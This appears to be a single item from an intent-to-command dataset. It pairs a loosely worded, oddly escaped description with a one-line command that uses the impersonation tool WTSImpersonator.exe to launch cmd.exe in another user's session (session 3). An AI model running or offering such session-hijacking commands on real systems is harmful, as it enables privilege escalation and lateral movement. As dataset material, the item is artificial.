# Natural language intent:
# "WTSImpersonator.exe,"   launching an external executable with \(-c flag\), and specifying the command to be executed, which is opening the Command Prompt "C:\\Windows\\System32\\cmd.exe".

.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
